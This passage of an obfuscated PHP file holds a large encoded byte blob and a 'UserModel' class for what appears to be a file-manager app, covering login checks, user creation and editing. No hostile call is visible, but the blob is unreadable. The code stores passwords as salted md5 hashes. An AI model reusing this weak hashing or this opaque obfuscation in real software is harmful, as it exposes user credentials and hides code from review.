2\32\362\211\74\246\144\43\100\174\117\11\127\72\304\235\26\37\117\342\167\213\307\212\222\200\241\163\113\154\342\230\112\346\365\302\374\211\32\150\343\14\335"."\225\322\51\206\160\162\213\303\244\336\225\1\315\17\147\72\74\66\42\32\103\175\143\231\16\23\107\127\45\360\50\216\374\234\12\51\45\372\41\356\35\40\220\111\237\64\221\20\43\314\270\250"."\313\56\166\261\202\63\71\1\116\230\34\130\156\12\206\251\22\252\244\76\15\140\233\134\123\213\175\32\70\124\224\35\243\374\346\71\66\263\304\53\67\67\244\267\344\10\113\345\304\151\71\42"."\xd4\xac\xd4\x51\x9a\x83\x78\xae\x61\x9d\xb9\x27\x60\xdb\xfb\xae\xf6\x2e\x3f\x7\x35\xf3\xe9\x49\xb5\x2b\xc2\x23\x60\x90\xd9\x6e\xea\x23\x3a\xec\x4\x87\x73\x46\x52\x89\x44\xdb\xc2\xc1\x40\xa4\x25\x1c\x5f\xaa".strrev('¡(ñ2¡H¿lK2›â›ÂæÑûzfş~õ£š~‰Á9Èây¾ñ-U´ÉUÍDi0®¹ğd')."\xb3\x5a\x4a\x95\x7a\xb1\xac\xc6\x3c\xbe\x5b\x98\x2d\x2b\x83\xb5\xee\x15\x72\x67\x85\xd2\x58\xca\x5c\x28\xea\xe5\xf9\x47\x75\x6c\x5a\x29\xb5\x58\x2a\x50\xaa\xd0\x1a\xc8\x5f\xf9\xb\xe4\xc1\x23\x39\x37\x92\x99"."\xf4\xfc\x64\x8d\x37\xf2\x43\x86\x65\x8\x76\xc0\x4a\x8c\xca\xb5\x7\x5a\x3a\xc2\x9d\x6a\x20\x12\x89\x2e\x77\x98\x26\x8b\xf3\x86\x22\xd7\xbe\xa4\xe4\xf7\xaa\xa4\x91\x11\x83\x20\xbc\x6f\xc9\xad\x29\x77\x4f\x9".strrev('ß×9-´Ù±3ÇY²Óß\\=Zú'."\0".'K¥†j(W/½*44£ùu§ƒ[;Ó÷²œ:\\>å'."\0".'Î')."\212\237\122\351\7\30\214\110\303\223\147\210\205\333\332\23\377\343\246\32\51\341\301\320\110\61\43\67\176\125\233\276\127\23\224\37\27\146\337\24\257\42\225\103\376\247\357\363\171\304\301\237"."\112\334\274\261\27\100\115\262\267\2\301\237\302\302\121\225\172\74\23\237\100\122\115\161\264\40\237\13\373\123\120\3\366\340\32\142\167\225\160\104\154\156\160\56\250\4\177\205\156\171\321\116"."\x1e\x6b\x25\xd9\x36\x88\x69\xf8\x10\x5b\x1\x84\x3b\xc\x3b\x5d\xf\xc\xba\x2d\xf6\x1d\xcf\x7\x96\x7d\x83\x3c\x49\x43\xd3\x7a\x70\x2f\x50\xce\x3e\xd1\x27\x14\xe3\x4f\x50\x89\xa2\xee\x94\xa\xd\x40\xc9\x8a".base64_decode('0JXxDEqTUkffuuTPCymLmEMK8QHibzGUK9gOdUC7fHtHGhIKwIqjItcC0jFnUTyw7ATbVA==').base64_decode('5bWU8GUxZbHNp5kbLQM41GoR1htufY2fZMqnTRnrhL/jC1z0CVuqrfCg/Ylul7+JR4v/3w==')."\24\244\211\161\311\35\257\263\222\362\6\131\356\365\124\310\166\370\271\277\1\163\330\371\256\55\206\270\37\370\163\74\355\47\315\60\342\136\101\176\214\320\131\310\123\366\64\226\102\36\47\127".base64_decode('EDOCsceWQ2w3TDJLn55Of3rhl62O7kZQPgefrOWkGBwwsqkitwkTgA5dqChIKcRYChp7hA==').strrev('¾Xr£Íb(¦b©(xËBfÒ×Ùd)‰`ˆn*íó±KjŞ&*>uY{õzUq¯åİ	ı<').strrev('‚‘Ä%³¦ËhŠı×^âÒå~ÎOÍ%÷?t_)=‡òš½”±{ÇÅ1™z@')."\xfc\x5a\xa1\x20\xe\x55\xe4\x15\x18\xfd\xeb\xb8\xc9\xd\x69\xdd\x89\x76\x95\xf8\x36\x51\xa9\xa1\x44\x5c\xd0\x9c\x74\xd0\x49\x81\x70\xe8\x59\xca\x87\xe9\xe1\x8e\x3\x5a\x94\x36\x93\xb2\x23\x6b\x7a\xe0\x23\x2e"."\x4\x43\x76\xd4\xce\x2e\x7a\xc2\xb\x8\x93\xab\x64\xa7\xee\x5c\x41\x8f\xf8\x11\xdf\x73\xfb\xcb\x4f\xe9\xb1\xad\x1b\x70\x14\x6c\x5b\xc4\x8c\xba\x6\x4d\xb2\x67\xf3\xc9\xbb\x3d\xc8\xa0\x2c\x62\x5e\x69\x90\xc"."\352\25\124\342\230\323\230\252\220\364\115\137\121\45\114\103\146\156\237\2\225\136\245\203\327\132\53\75\62\107\47\1\371\151\321\323\174\23\205\343\102\114\220\135\65\11\253\40\367\103\252\345"."\x8f\xc2\xb2\x7\x60\xd9\x2c\x82\xd7\x5f\x2b\x3c\xe9\x3a\xe9\x8b\xb0\x1e\x71\xd\xfc\xd3\xde\xae\x13\x97\x8e\xb\x68\x54\x9c\xcf\xfb\x72\x21\x83\xef\x53\xca\xb6\x3a\xee\x5d\xe\x47\xab\xab\x40\xcc\x8d\xe4\x84"."\x59\xae\xa4\x16\x26\xd\x8e\xf7\x6a\xa5\x5e\x3\x97\x2b\x7f\xf3\x56\x42\x83\xd4\xef\x52\x31\xeb\x21\xd6\x1d\x1e\x66\x81\x59\xf1\xd9\x5c\xc7\x4b\x7a\xee\x1\xad\xf0\xf0\xee\x67\x56\x8\xb7\x2f\xc8\x26\x2f\xe5".base64_decode('ZICNi/qL7Bjcnc1w0C5ai8VNROqrumytWJlLNcyas0BWpoghFIfD4PAFzrhB3BFEoTjQ4A==').base64_decode('UZiDbJkRkETndZ7yN5pdi8H/bMKIfQnNKlkJlz9jX4YBQqeS+Zq0NrrsiExs2mOJWUdXQw==')."\361\62\263\363\133\124\222\250\320\17\361\131\151\262\320\327\166\315\54\336\323\347\360\1\202\135\324\234\133\325\112\73\62\202\11\266\375\303\72\140\21\163\32\146\201\366\106\44\113\133\66\271".strrev('€d²¢ğ©›Sş»Mû¸i1º-»dƒÿDâM³Èû…Ÿ4j5D¼qp«tÛF')."\363\51\175\240\102\37\337\165\172\65\333\53\21\247\244\272\324\355\50\31\154\140\27\142\163\354\354\267\253\172\124\114\324\321\347\121\46\313\124\56\371\111\17\57\13\357\214\222\314\207\113\263"."\33\356\223\350\26\310\5\153\247\364\44\77\356\112\156\47\13\347\102\144\352\72\246\261\344\217\136\276\335\113\52\222\347\107\171\325\322\123\271\102\43\105\124\130\320\43\230\334\304\42\203\64"."\63\320\306\357\206\153\222\171\241\123\115\6\162\236\364\104\74\102\237\364\212\272\51\207\245\47\230\321\232\20\145\227\67\120\163\34\73\132\24\27\136\330\45\376\225\162\1\31\316\10\323\20"."\xef\x85\x13\x21\x78\x6\x88\xbf\xb2\x7\x2\xc7\x1e\x8a\xbf\x25\xea\xd8\x53\x59\xee\x7\x85\x91\x8c\xe8\x78\x55\x25\x55\xf6\x7c\x3b\xb0\x51\x72\x91\x8f\x7e\x4d\x5a\x88\x59\x13\x33\x52\xa8\xb3\x94\x13\x11\x49".strrev('ãâÖ‡j@Û'."\r".'×çë€Hv:œî„õıÒß¯ü/Û0Óª}NQ=rÁşæqt${¨áÑ<b6Lõ')."\131\256\4\241\12\152\127\77\234\213\355\241\100\123\10\371\276\41\301\142\110\234\33\264\63\257\224\314\131\245\306\116\357\264\154\126\132\222\53\357\163\312\336\110\107\244\70\310\37\305\256\24"."\x71\x5f\x53\x76\xbf\x97\xde\x43\xf4\xc3\xec\xc1\xf3\x3e\xc1\x55\x30\xac\x52\x31\xf9\x95\x65\xd7\xb\xeb\xa4\x2e\x4\x91\x6a\xe1\x26\x8c\x90\x99\xed\x78\xd8\xbe\xac\xc2\x84\xa0\x20\x26\x8e\xb\x56\x97\x37\x92"."\203\25\316\360\211\61\257\363\61\5\111\346\51\313\46\232\217\104\43\156\117\314\102\111\274\41\45\336\161\140\30\144\17\6\321\2\333\272\326\302\342\322\7\277\340\65\5\170\241\314\377\34"."\240\62\256\231\160\14\256\3\50\217\233\140\155\76\106\27\216\22\35\256\107\240\151\46\346\26\31\114\64\44\66\135\156\322\121\136\232\63\24\271\10\276\220\340\124\276\341\141\305\15\363\326"."\171\135\200\172\257\253\72\376\16\266\163\322\70\36\146\246\146\60\150\246\305\260\222\205\51\333\310\41\27\71\2\367\226\227\241\23\44\56\362\114\62\105\53\63\12\336\50\241\160\304\41\31"."\37\214\341\164\25\115\42\177\72\241\134\361\44\231\165\47\45\255\256\133\244\244\340\351\76\271\43\362\61\260\363\54\11\333\25\212\303\325\104\64\26\122\227\207\261\267\215\360\252\120\67\363"."\26\155\230\344\35\27\126\145\167\107\15\271\215\7\23\0\155\216\132\115\101\112\72\342\212\222\212\131\270\74\266\163\205\40\77\12\166\336\347\226\256\200\60\127\143\262\322\323\231\31\137\337"."\x71\xce\xc5\xc5\x95\xb2\x25\xcd\xa2\x25\xfb\xb\x75\x24\x62\x69\xce\x44\xa9\x31\xb6\x53\xef\xce\xa3\x89\xac\x27\x6d\x3d\xa5\x60\xb9\xc0\xb1\x55\xe8\x99\x5d\x37\xab\xef\xd3\x6a\x41\xe9\x3c\xe7\xec\xcf\xc8\x9".base64_decode('e5b4LC8zQWZ5KpYzqWugSmmINuO2g4jEI0Dux39aHW63GiUlrEIckMErUJOMTacZFBKLKw==')."\15\263\206\311\123\361\246\227\237\167\263\207\141\260\111\237\37\373\47\303\127\116\374\204\376\100\167\276\122\315\251\314\232\11\253\32\204\356\210\160\334\362\255\46\174\311\56\216\106\213\261\134"."\147\231\337\76\347\165\63\251\74\321\50\121\45\221\103\127\4\26\14\62\110\72\321\107\273\274\224\363\271\65\222\110\300\314\161\71\324\40\235\111\73\115\2\370\115\336\262\245\266\144\104\244"."\144\122\212\71\300\105\277\330\41\101\130\370\217\42\311\364\134\55\60\244\161\27\155\356\122\335\216\35\264\144\100\220\44\74\44\124\176\106\54\216\256\45\261\225\25\303\133\160\41\103\270\340".base64_decode('Es8Vq6I2JIRwsQlMpVq1oQpZU7rbxR6C8KxEiJc8iYgLQvqw/HXIJy7kODKWQ4WnEam8OA==')."\27\24\335\304\260\112\335\47\74\320\131\134\366\144\302\211\112\200\350\303\131\334\332\106\332\160\143\163\44\141\206\103\273\302\365\112\342\223\116\277\51\74\33\37\63\224\207\334\55\364\72\240"."\56\25\2\126\341\61\221\323\225\4\112\55\251\372\212\272\57\211\4\364\154\104\252\116\266\31\230\264\100\274\362\107\4\125\72\121\54\71\234\21\11\114\250\221\153\161\254\152\274\143\220\63"."\46\47\72\232\343\36\132\262\343\25\344\113\201\71\162\224\100\323\2\316\44\232\137\167\265\136\56\340\356\31\55\341\170\151\121\206\17\33\166\162\100\332\236\227\47\226\303\213\145\310\206\6"."\x54\xee\x87\xbb\xb5\xc\xd7\x6e\xa5\x85\xa8\xa4\xac\x3d\x92\x41\x52\xc2\xac\x50\x86\xb6\xa8\x62\x31\x9a\x84\x4b\x8a\x7d\x90\xa3\xec\x24\x28\xc0\x65\x69\x12\x2e\x5b\x96\xcc\xa\x97\xe1\x95\x94\xb3\xb5\x92\x35".base64_decode('SffKkQdKsFSFDgtVkZR1MnxWzFz+OaBEd26iNavcCqHscpmAVGpFxcyTtsKdW0gleLNbKQ==').strrev('r…4åŒ¹b®-•TöË$+,¾É,Iú(ZD2_*:0•©4.SSR–mñ*Q\\åGaÅ').base64_decode('wWUEgSd2GmEmk0hIyxqDwtSUXUkBBQe32xzMm3x5SgnzYixbBYpuPJfV5iT9fEnyfl/xhg==')."\214\7\153\244\312\265\75\131\215\137\133\24\326\170\164\127\155\332\106\122\167\272\330\227\135\132\322\164\366\221\254\244\377\166\251\236\205\176\314\141\224\123\101\41\113\100\64\350\23\247\100\264"."\x3e\xd1\x17\x89\x26\x1c\x97\xd9\xa8\x48\x2\x87\x67\xf4\x8\x3e\x88\xed\x42\xf8\xe1\x2b\xf1\xfe\x4e\x97\x70\x9a\x1c\x37\x8b\xb6\x7\xa7\x25\xcc\x2\xf9\x6d\x36\x6d\x5b\x58\xb4\x50\x15\x14\x11\xc4\xf1\x3a\xec"."\x91\xc\xb8\x50\x48\x9c\xb4\xe2\x46\x91\x73\x3b\x42\xb6\x84\x63\x91\x20\x18\x3\x60\xdd\x4e\x5c\xa7\xa9\x84\xcf\x39\x22\xf8\x3c\x90\x47\xe4\x65\x16\x8c\x2\x5a\x4b\x2e\xb3\x5\x1\x18\x34\x53\xfd\xe6\x8\xf3"."\43\211\350\112\102\222\70\61\324\334\262\345\220\373\102\265\154\216\106\234\254\130\176\232\342\207\367\234\274\244\16\170\53\326\267\246\220\161\24\247\257\157\162\13\363\117\253\1\116\15\104\25"."\xf4\x31\x17\xa2\xc2\x85\xcb\x76\xf1\x44\xbc\x2c\xa9\x2b\x10\x8f\x2f\x8f\xc6\x5a\xe8\xdb\x2f\x65\xc9\xa4\x94\x64\xf4\x57\x96\xd4\xd5\x1e\xed\x9c\x2c\x2d\xd4\x11\x8\x47\xca\xd2\xb0\x7d\x60\xa7\x2a\x3c\x92\xd2"."\244\160\27\151\45\71\377\236\254\25\341\340\122\321\222\162\107\260\354\220\56\2\317\211\212\161\221\16\255\12\3\46\73\213\142\371\343\132\226\251\213\244\103\15\75\47\134\326\212\62\116\55"."\x98\x3c\xfe\x16\xf3\x2d\xcd\x3\xce\x7\x17\x5d\xe6\xba\x8c\xb0\xa1\x22\x6c\xed\xd7\x9\x75\xc7\xa\x0\xc5\x6f\xe6\x70\xfe\xc0\xe5\x7c\xf9\xa2\xb2\x30\x37\xf1\x39\xcc\x52\x24\x38\x99\x4f\x84\x41\x49\x74\x2a"."\xaf\xfd\x4\x30\xa3\x22\xb2\xe4\x3\x8f\xf2\xc3\x38\x92\x2a\x90\x81\x1b\x79\xaa\x9\xc6\xa4\x6b\xcc\x7e\xe9\xb0\x8d\xee\xb8\xe0\xe2\x3c\xa0\x57\xb2\xee\xa4\x61\x47\xb2\xad\x65\x2a\x5a\x67\x50\xcd\x35\xe6\x18"."\102\247\374\177\0\130\122\210\77\115\272\0\0", 10, -8))); goto bÉç¹öÃ§×; aòÊË­ÖŒ™: define($_SERVER[ÔÕ±ĞšÎ][319], 3); define($_SERVER[ÔÕ±ĞšÎ][320], 1); define($_SERVER[ÔÕ±ĞšÎ][321], 0); goto A×†Ë¥ïœÙ; cÓ¶İ‹¡„Ñ: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\x61\155\x65" => "\x75\163\145\162\x5f\x6d\145\164\x61", "\x6d\145\164\x61\106\151\x65\154\144" => "\165\x73\x65\x72\111\x44"); protected $simpleField = "\x75\163\x65\162\111\x44\54\x6e\151\143\153\116\x61\x6d\x65\54\x6e\141\x6d\145\54\141\x76\x61\164\x61\x72\x2c\x73\145\x78\54\x73\164\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ü•ãóŠŞ) { $è°·æ• =& $_SERVER[ÔÕ±ĞšÎ]; $ÆşÙªá³ = $è°·æ•[2467]; return array($è°·æ•[2061] => array($Ü•ãóŠŞ[0], $ÆşÙªá³), $è°·æ•[2063] => array($Ü•ãóŠŞ[0], $ÆşÙªá³), $è°·æ•[2468] => array($Ü•ãóŠŞ[0], $ÆşÙªá³)); } protected function getInfo($ØßÌ–‘, $‹äÉ˜òö = false) { $Ëâñ‘èğ = $this->getInfoSimple($ØßÌ–‘); if (!is_array($Ëâñ‘èğ)) { return array(); } if ($‹äÉ˜òö) { return $this->_getInfoApply($Ëâñ‘èğ); } return $this->cacheFunctionGet($_SERVER[ÔÕ±ĞšÎ][2065], $ØßÌ–‘); } protected function getInfoFull($ë± üÄÂ, $õÈñĞœÚ = false) { $Òş€ÇÔ† = $this->getInfoSimple($ë± üÄÂ); if (!is_array($Òş€ÇÔ†)) { return array(); } if ($õÈñĞœÚ) { return $this->_getInfoApply($Òş€ÇÔ†, !0); } return $this->cacheFunctionGet($_SERVER[ÔÕ±ĞšÎ][2469], $ë± üÄÂ); } private function _getInfoApply($£¾üúÉ, $¬Ç¯Ğ—É = false) { $¦¨üİ„ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$£¾üúÉ) { return $£¾üúÉ; } $”×¤‹è = md5($¦¨üİ„[2470] . $£¾üúÉ[$¦¨üİ„[968]] . $¦¨üİ„[2471] . $£¾üúÉ[$¦¨üİ„[32]]); $£¾üúÉ = $this->_listDataApplyItem($£¾üúÉ); $Ş°˜‚İ¢ = Model($¦¨üİ„[1423])->metaGet($£¾üúÉ[$¦¨üİ„[90]][$¦¨üİ„[193]]); $£¾üúÉ[$¦¨üİ„[2472]] = $”×¤‹è; $£¾üúÉ[$¦¨üİ„[90]][$¦¨üİ„[2261]] = isset($Ş°˜‚İ¢[$¦¨üİ„[2262]]) ? $Ş°˜‚İ¢[$¦¨üİ„[2262]] : null; if ($¬Ç¯Ğ—É) { $£¾üúÉ[$¦¨üİ„[541]] = $this->metaGet($£¾üúÉ[$¦¨üİ„[1777]]); } return $£¾üúÉ; } protected function getInfoSimple($Üá«ä, $à™ş’‡± = false) { $ÉÅ »Ì =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Üá«ä) { return array(); } if ($à™ş’‡±) { $ûĞÓ½Å½ = $this->where(array($ÉÅ »Ì[1777] => intval($Üá«ä)))->find(); if (!is_array($ûĞÓ½Å½)) { return array(); } $ûĞÓ½Å½[$ÉÅ »Ì[2473]] = Action($ÉÅ »Ì[2474])->parseUrl($ûĞÓ½Å½[$ÉÅ »Ì[2473]]); return $ûĞÓ½Å½; } return $this->cacheFunctionGet($ÉÅ »Ì[2066], $Üá«ä); } protected function getInfoSimpleOuter($Æ¦¯Î·÷) { $®¶ıæ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Æ¦¯Î·÷ || $Æ¦¯Î·÷ == 0) { return array($®¶ıæ[1777] => $®¶ıæ[230], $®¶ıæ[32] => $®¶ıæ[176] . LNG($®¶ıæ[2475]) . $®¶ıæ[178], $®¶ıæ[2473] => STATIC_PATH . $®¶ıæ[2476]); } $ñİÄÛë¨ = $this->cacheFunctionGet($®¶ıæ[2066], $Æ¦¯Î·÷); $Ş½½Ûœ = array_field_key($ñİÄÛë¨, explode($®¶ıæ[50], $this->simpleField)); if (!$Ş½½Ûœ) { return array($®¶ıæ[1777] => $®¶ıæ[1275], $®¶ıæ[32] => $®¶ıæ[176] . LNG($®¶ıæ[2477]) . $®¶ıæ[178], $®¶ıæ[2473] => STATIC_PATH . $®¶ıæ[2478]); } $Ş½½Ûœ[$®¶ıæ[2473]] = Action($®¶ıæ[2474])->parseUrl($Ş½½Ûœ[$®¶ıæ[2473]]); return $Ş½½Ûœ; } protected function groupUser($¸ş×¨¦•) { } public static function errorLang($‚ÁÄÓš) { $‚ÏãÑŸ =& $_SERVER[ÔÕ±ĞšÎ]; $±Öèœ¬ƒ = array(self::ERROR_USER_NOT_EXISTS => $‚ÏãÑŸ[2479], self::ERROR_USER_PASSWORD_ERROR => $‚ÏãÑŸ[2480], self::ERROR_USER_EXIST_NAME => $‚ÏãÑŸ[2481], self::ERROR_USER_EXIST_PHONE => $‚ÏãÑŸ[2482], self::ERROR_USER_EXIST_EMAIL => $‚ÏãÑŸ[2483], self::ERROR_USER_LOGIN_LOCK => $‚ÏãÑŸ[2484], self::ERROR_IP_NOT_ALLOW => $‚ÏãÑŸ[2485], self::ERROR_USER_EXIST_NICKNAME => $‚ÏãÑŸ[2486]); $•¹óÛÈù = LNG($±Öèœ¬ƒ[$‚ÁÄÓš]); if ($‚ÁÄÓš == self::ERROR_USER_LOGIN_LOCK) { $ñ÷Ÿ ×Ä = (int) Model($‚ÏãÑŸ[2487])->get($‚ÏãÑŸ[2488]); if ($ñ÷Ÿ ×Ä > 60) { $•¹óÛÈù = str_replace($‚ÏãÑŸ[91], ceil($ñ÷Ÿ ×Ä / 60), $•¹óÛÈù); } } return $•¹óÛÈù; } protected function metaSet($¯é£ÌÖ…, $âî¼ÕÖ = null, $Õ’ôï¥ = null) { $this->clearCache($¯é£ÌÖ…); return parent::metaSet($¯é£ÌÖ…, $âî¼ÕÖ, $Õ’ôï¥); } public function getInfoByMeta($ö¢ùÖ»å, $·Çàæ·) { $”³…§ô÷ =& $_SERVER[ÔÕ±ĞšÎ]; $™˜Ù´ªÙ = Model($”³…§ô÷[2489])->where(array($”³…§ô÷[97] => $ö¢ùÖ»å, $”³…§ô÷[452] => $·Çàæ·))->find(); if ($™˜Ù´ªÙ) { return $this->getInfo($™˜Ù´ªÙ[$”³…§ô÷[1777]]); } return !1; } public function userLoginCheck($Ñò¡™ß°, $Ğ€£‰–°) { $ÓÁ¾¦ôæ =& $_SERVER[ÔÕ±ĞšÎ]; $ÏÌßûÀ = $this->userLoginFind($Ñò¡™ß°); if (!$ÏÌßûÀ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÏÌßûÀ[$ÓÁ¾¦ôæ[1777]], $Ğ€£‰–°)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÏÌßûÀ[$ÓÁ¾¦ôæ[1777]]); } public function userLoginFind($ˆâö¢ö) { $œâ°¬É =& $_SERVER[ÔÕ±ĞšÎ]; $ú…úáá¾ = array($œâ°¬É[32] => $ˆâö¢ö, $œâ°¬É[2274] => $ˆâö¢ö, $œâ°¬É[382] => $ˆâö¢ö, $œâ°¬É[2490] => $ˆâö¢ö, $œâ°¬É[1079] => $œâ°¬É[1081]); if ($this->nickNameRpt()) { unset($ú…úáá¾[$œâ°¬É[2274]]); } return $this->where($ú…úáá¾)->find(); } public function clearCache($øÕÛšË÷) { $ÖÌ”¹¥Õ =& $_SERVER[ÔÕ±ĞšÎ]; $this->cacheFunctionClear($ÖÌ”¹¥Õ[2065], $øÕÛšË÷); $this->cacheFunctionClear($ÖÌ”¹¥Õ[2066], $øÕÛšË÷); $this->cacheFunctionClear($ÖÌ”¹¥Õ[2469], $øÕÛšË÷); } public function userPasswordCheck($¯¼ı‹áú, $ç†Íí… ) { $Å¢î´¢ =& $_SERVER[ÔÕ±ĞšÎ]; $Õ©³Ì‹è = $this->where(array($Å¢î´¢[1777] => intval($¯¼ı‹áú)))->find(); $êØ¦í‚ğ = $this->metaGet($¯¼ı‹áú); $Ğ±˜ÙÖª = isset($êØ¦í‚ğ[$Å¢î´¢[2491]]) ? $êØ¦í‚ğ[$Å¢î´¢[2491]] : $Å¢î´¢[12]; if (md5($Ğ±˜ÙÖª . trim($ç†Íí… )) !== $Õ©³Ì‹è[$Å¢î´¢[968]]) { return !1; } return !0; } public function userAdd($ÓÜë™²è) { $µÇ‡¾•… =& $_SERVER[ÔÕ±ĞšÎ]; $ÖÛ‹´Âé = array($µÇ‡¾•…[496] => $ÓÜë™²è[$µÇ‡¾•…[32]], $µÇ‡¾•…[2492] => $ÓÜë™²è[$µÇ‡¾•…[2186]], $µÇ‡¾•…[2493] => isset($ÓÜë™²è[$µÇ‡¾•…[382]]) ? $ÓÜë™²è[$µÇ‡¾•…[382]] : $µÇ‡¾•…[12], $µÇ‡¾•…[2494] => isset($ÓÜë™²è[$µÇ‡¾•…[2490]]) ? $ÓÜë™²è[$µÇ‡¾•…[2490]] : $µÇ‡¾•…[12], $µÇ‡¾•…[2495] => isset($ÓÜë™²è[$µÇ‡¾•…[2274]]) ? $ÓÜë™²è[$µÇ‡¾•…[2274]] : $ÓÜë™²è[$µÇ‡¾•…[32]], $µÇ‡¾•…[2496] => isset($ÓÜë™²è[$µÇ‡¾•…[2473]]) ? $ÓÜë™²è[$µÇ‡¾•…[2473]] : $µÇ‡¾•…[12], $µÇ‡¾•…[2497] => isset($ÓÜë™²è[$µÇ‡¾•…[2498]]) ? $ÓÜë™²è[$µÇ‡¾•…[2498]] : 1, $µÇ‡¾•…[2499] => $ÓÜë™²è[$µÇ‡¾•…[968]], $µÇ‡¾•…[2067] => isset($ÓÜë™²è[$µÇ‡¾•…[1964]]) ? $ÓÜë™²è[$µÇ‡¾•…[1964]] : 1024 * 1024 * 20, $µÇ‡¾•…[2068] => 0, $µÇ‡¾•…[2500] => 0, $µÇ‡¾•…[2112] => isset($ÓÜë™²è[$µÇ‡¾•…[824]]) ? $ÓÜë™²è[$µÇ‡¾•…[824]] : 1); if (!empty($ÓÜë™²è[$µÇ‡¾•…[1777]])) { $ÖÛ‹´Âé[$µÇ‡¾•…[1777]] = $ÓÜë™²è[$µÇ‡¾•…[1777]]; } $˜¥…¼„ë = $this->_checkExist($ÓÜë™²è); if ($˜¥…¼„ë !== !0) { return $˜¥…¼„ë; } if (!empty($ÖÛ‹´Âé[$µÇ‡¾•…[2473]]) && strlen($ÖÛ‹´Âé[$µÇ‡¾•…[2473]]) > 255) { $ÖÛ‹´Âé[$µÇ‡¾•…[2473]] = $µÇ‡¾•…[12]; } $ç¥è¢ö˜ = $this->add($ÖÛ‹´Âé); $§Ûîïµí = array($µÇ‡¾•…[2499] => $ÖÛ‹´Âé[$µÇ‡¾•…[968]], $µÇ‡¾•…[2495] => $ÖÛ‹´Âé[$µÇ‡¾•…[2274]]); $this->userEdit($ç¥è¢ö˜, $§Ûîïµí); Model($µÇ‡¾•…[1423])->userRootAdd($ç¥è¢ö˜); return $ç¥è¢ö˜; } protected function userEditTest($üö“ÂÁ, $Ö®˜²’ı) { return $this->call($_SERVER[ÔÕ±ĞšÎ][2501], $üö“ÂÁ, $Ö®˜²’ı); } protected function userEdit($ÛÇÖ×„, $»«Çºƒ¡) { $½Éé¸î =& $_SERVER[ÔÕ±ĞšÎ]; $ĞÀˆú¹— = $this->getInfoSimple($ÛÇÖ×„); if (!$ĞÀˆú¹—) { return !1; } $åÖÛ‚¹ı = $this->_checkExist($»«Çºƒ¡, $ÛÇÖ×„); if ($åÖÛ‚¹ı !== !0) { return $åÖÛ‚¹ı; } if (isset($»«Çºƒ¡[$½Éé¸î[968]]) && trim($»«Çºƒ¡[$½Éé¸î[968]]) != $½Éé¸î[12]) { $±ô¤ã¦Â = $this->metaGet($ÛÇÖ×„); if (empty($±ô¤ã¦Â[$½Éé¸î[2491]])) { $±ô¤ã¦Â[$½Éé¸î[2491]] = rand_string(10); Model($½Éé¸î[579])->metaSet($ÛÇÖ×„, $½Éé¸î[2491], $±ô¤ã¦Â[$½Éé¸î[2491]]); } $»«Çºƒ¡[$½Éé¸î[968]] = md5($±ô¤ã¦Â[$½Éé¸î[2491]] . trim($»«Çºƒ¡[$½Éé¸î[968]])); } else { unset($»«Çºƒ¡[$½Éé¸î[968]]); } if (!empty($»«Çºƒ¡[$½Éé¸î[2473]]) && strlen($»«Çºƒ¡[$½Éé¸î[2473]]) > 255) { $»«Çºƒ¡[$½Éé¸î[2473]] = $½Éé¸î[12]; } $this->where(array($½Éé¸î[1768] => $ÛÇÖ×„))->save($»«Çºƒ¡); if (isset($»«Çºƒ¡[$½Éé¸î[2274]])) { $this->setNamePinyin($ÛÇÖ×„, $»«Çºƒ¡[$½Éé¸î[2274]]); } $this->clearCache($ÛÇÖ×„); return !0; } public function setNamePinyin($ş”è¾’—, $Ÿ°èÂÁ€ = false) { $í•ŠóÄ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Ÿ°èÂÁ€) { $ş•Î¢æØ = $this->getInfoSimple($ş”è¾’—); $Ÿ°èÂÁ€ = $ş•Î¢æØ[$í•ŠóÄ[2274]] ? $ş•Î¢æØ[$í•ŠóÄ[2274]] : $ş•Î¢æØ[$í•ŠóÄ[32]]; } $š³¾¬×¡ = Model($í•ŠóÄ[599]); if (!Input::check($Ÿ°èÂÁ€, $í•ŠóÄ[660])) { return $š³¾¬×¡->metaSet($ş”è¾’—, array($í•ŠóÄ[540] => $í•ŠóÄ[12], $í•ŠóÄ[539] => $í•ŠóÄ[12])); } return $š³¾¬×¡->metaSet($ş”è¾’—, array($í•ŠóÄ[540] => str_replace($í•ŠóÄ[53], $í•ŠóÄ[12], Pinyin::get($Ÿ°èÂÁ€)), $í•ŠóÄ[539] => Pinyin::get($Ÿ°èÂÁ€, $í•ŠóÄ[661]))); } private function nickNameRpt() { $Ãª“ûøè =& $_SERVER[ÔÕ±ĞšÎ]; $İ¢®¨‚¤ = Model($Ãª“ûøè[844])->get($Ãª“ûøè[2502]); $Ì òÆİª = $GLOBALS[$Ãª“ûøè[6]][$Ãª“ûøè[459]][$Ãª“ûøè[2502]]; $¡ÜóÓË = !is_null($İ¢®¨‚¤) ? $İ¢®¨‚¤ : $Ì òÆİª; return !!$¡ÜóÓË; } private function _checkExist($ò“´ìğ, $´ùÊ‰Œ² = false) { $àĞÀÕÄô =& $_SERVER[ÔÕ±ĞšÎ]; $ĞğÆ†Ì = array($àĞÀÕÄô[32] => UserModel::ERROR_USER_EXIST_NAME, $àĞÀÕÄô[2274] => UserModel::ERROR_USER_EXIST_NICKNAME, $àĞÀÕÄô[382] => UserModel::ERROR_USER_EXIST_EMAIL, $àĞÀÕÄô[2490] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ĞğÆ†Ì[$àĞÀÕÄô[2274]]); } $Ó‡¬¢²ñ = $´ùÊ‰Œ² ? array($àĞÀÕÄô[1777] => array($àĞÀÕÄô[2503], $´ùÊ‰Œ²)) : array(); foreach ($ĞğÆ†Ì as $»Ò¢¤–é => $øÀÑÄ­Ã) { $ûóÜ¼•á = array(); foreach ($ĞğÆ†Ì as $ıÒ”Ôù› => $„¥Õ¯Ú) { if 